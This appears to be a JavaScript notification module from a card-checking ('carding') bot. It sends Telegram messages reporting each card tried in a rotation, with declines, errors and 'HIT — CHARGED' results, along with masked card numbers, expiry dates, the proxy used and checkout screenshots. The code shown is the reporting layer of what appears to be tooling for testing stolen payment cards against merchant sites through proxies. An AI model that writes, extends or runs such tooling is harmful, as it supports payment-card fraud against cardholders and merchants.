// ⚡ ALPHA Worker — Telegram sender (v3: multi-card rotation context)

const TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const BASE  = `https://api.telegram.org/bot${TOKEN}`;

export async function sendMessage(chatId, text) {
  try {
    await fetch(`${BASE}/sendMessage`, {
      method : 'POST',
      headers: { 'Content-Type': 'application/json' },
      body   : JSON.stringify({ chat_id: chatId, text, parse_mode: 'HTML' }),
    });
  } catch (e) {
    console.warn('[TG] sendMessage failed:', e.message);
  }
}

async function sendPhoto(chatId, photoBuffer, caption) {
  const form = new FormData();
  form.append('chat_id',    String(chatId));
  form.append('photo',      new Blob([photoBuffer], { type: 'image/jpeg' }), 'result.jpg');
  form.append('caption',    caption.slice(0, 1024)); // TG caption limit
  form.append('parse_mode', 'HTML');
  const resp = await fetch(`${BASE}/sendPhoto`, { method: 'POST', body: form });
  if (!resp.ok) throw new Error(`sendPhoto HTTP ${resp.status}`);
}

// ── Card number masker (duplicated from vercel-webhook for worker independence) ─
export function maskNumber(number) {
  const n = String(number).replace(/\s/g, '');
  if (n.length < 10) return n;
  const first6 = n.slice(0, 6);
  const last4  = n.slice(-4);
  const mid    = 'x'.repeat(n.length - 10);
  return `${first6}${mid}${last4}`.match(/.{1,4}/g)?.join(' ') ?? `${first6}...${last4}`;
}

// ── Per-attempt status message (sent between card attempts in a rotation) ─────
//    Used to show "❌ Card 1/3 declined — trying next..."
export async function sendAttemptUpdate(chatId, { attemptNum, total, masked, expiry, status, message }) {
  if (total <= 1) return; // no progress updates needed for single-card runs

  const emoji = status === 'decline' ? '❌' : status === 'error' ? '⚠️' : '⏳';
  const label = status === 'decline' ? 'Declined' : status === 'error' ? 'Error' : 'Processing';

  await sendMessage(chatId,
    `${emoji} <b>Card ${attemptNum}/${total} — ${label}</b>\n` +
    `💳 <code>${masked}</code>  📅 ${expiry}\n` +
    (message ? `📄 ${message}\n` : '') +
    (attemptNum < total ? `\n⏩ Trying card ${attemptNum + 1}/${total}...` : '')
  );
}

// ── Final result (hit, all-declined, or error) ────────────────────────────────
// meta: { cardNum, total, masked, expiry, proxy, exhausted }
export async function sendResult(chatId, result, meta = {}) {
  const { status, message, screenshot, url } = result;
  const { cardNum = 1, total = 1, masked = '', expiry = '', proxy, exhausted } = meta;

  const emoji = status === 'hit'     ? '✅'
              : status === 'decline' ? '❌'
              : '⚠️';

  const label = status === 'hit'     ? 'HIT — CHARGED'
              : status === 'decline' ? 'DECLINED'
              : 'UNKNOWN / ERROR';

  // Build multi-card context line
  let contextLine = '';
  if (total > 1) {
    if (status === 'hit') {
      contextLine = `🎯 Hit on card ${cardNum} of ${total}\n`;
    } else if (exhausted) {
      contextLine = `🚫 All ${total} cards exhausted — no hit\n`;
    }
  }

  const lines = [
    `${emoji} <b>${label}</b>`,
    contextLine,
    masked  ? `💳 <code>${masked}</code>  📅 ${expiry}` : '',
    message ? `📄 ${message}` : '',
    url     ? `🔗 <code>${url.slice(0, 70)}</code>` : '',
    proxy   ? `🌐 ${proxy}` : '',
  ].filter(Boolean).join('\n');

  if (screenshot) {
    try {
      await sendPhoto(chatId, screenshot, lines);
      return;
    } catch (e) {
      console.warn('[TG] sendPhoto failed, using text fallback:', e.message);
    }
  }
  await sendMessage(chatId, lines);
}
